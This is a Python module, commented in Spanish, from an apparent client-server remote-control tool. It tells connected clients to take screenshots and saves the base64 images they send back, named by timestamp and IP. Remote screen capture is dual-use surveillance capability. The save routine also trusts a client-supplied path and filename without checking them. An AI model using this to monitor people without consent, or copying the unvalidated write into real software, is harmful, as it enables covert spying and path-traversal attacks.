import os
from utils.logger import get_console
from utils.validator import validate_path
from config.settings import SCREENSHOTS_DIR, DATA_DIR
from datetime import datetime
import base64

class ScreenshotHandler:
    """Maneja la transferencia de capturas de pantalla desde los clientes."""
    
    def __init__(self, client_manager):
        self.client_manager = client_manager
        self.console = get_console()
    
    def enviar_comando_capturar_pantalla(self, ruta_destino=None, nombre_archivo=None, cliente_id=None):
        """Solicita una captura de pantalla desde un cliente."""
        # Si no se pasa ruta_destino usar ruta por defecto
        if not ruta_destino:
            ruta_final = os.path.normpath(SCREENSHOTS_DIR)
        else:
            # Validar ruta_destino
            if not validate_path(ruta_destino):
                self.console.print("[bold red]Error: La ruta de destino no es válida.[/bold red]")
                return False
            
            # Determinar si es ruta absoluta o relativa
            if os.path.isabs(ruta_destino):
                ruta_final = os.path.normpath(ruta_destino)
            else:
                from config.settings import DATA_DIR
                ruta_final = os.path.normpath(os.path.join(DATA_DIR, ruta_destino))
        
        if nombre_archivo and not validate_path(nombre_archivo):
            self.console.print("[bold red]Error: El nombre del archivo no es válido.[/bold red]")
            return False
        
        mensaje = {
            "accion": "captura_pantalla",
            "ruta_destino": ruta_final,
            "nombre_archivo": nombre_archivo or "screenshot.png"
        }
        
        if cliente_id is None:
            self.client_manager.servidor.enviar_comando_todos(mensaje)
        else:
            if not self.client_manager.servidor.obtener_cliente_por_id(cliente_id):
                self.console.print(f"[bold red]Error: Cliente con ID {cliente_id} no existe.[/bold red]")
                return False
            self.client_manager.servidor.enviar_comando_cliente(cliente_id, mensaje)
        
        self.console.print(f"[bold green]Comando enviado: capturar pantalla hacia '{mensaje['ruta_destino']}'[/bold green]")
        return True
    
    def _procesar_captura_enviada(self, datos_dict, cliente_id):
        """Procesa una captura de pantalla enviada."""
        nombre_archivo = datos_dict.get("nombre_archivo")
        
        timestamp = datetime.now().strftime("__%d_%m_%Y__%H_%M_%S")
        
        ip_cliente = cliente_id.split("(")[-1].replace(")", "").replace("]", "").replace(".", "-")

        nombre_base, extension = os.path.splitext(nombre_archivo)
        
        nuevo_nombre = f"{nombre_base}{timestamp}__{ip_cliente}{extension}"
        
        ruta_carpeta = datos_dict.get("ruta_destino", SCREENSHOTS_DIR)
        ruta_destino = os.path.join(ruta_carpeta, nuevo_nombre)

        datos_imagen = datos_dict.get("datos_imagen")
        ancho = datos_dict.get("ancho", 0)
        alto = datos_dict.get("alto", 0)
        
        try:
            directorio = os.path.dirname(ruta_destino)
            os.makedirs(directorio, exist_ok=True)
            
            with open(ruta_destino, "wb") as f:
                f.write(base64.b64decode(datos_imagen))
            
            self.console.print(f"\n{cliente_id} [bold green]📸 Captura de pantalla guardada:[/bold green]")
            self.console.print(f"{cliente_id} Archivo: {ruta_destino}")
            self.console.print(f"{cliente_id} Resolución: {ancho}x{alto} píxeles")
            self.console.print(f"{cliente_id} Tamaño: {os.path.getsize(ruta_destino)} bytes")
        except Exception as e:
            self.console.print(f"\n{cliente_id} [bold red]Error al guardar captura de pantalla:[/bold red] {str(e)}")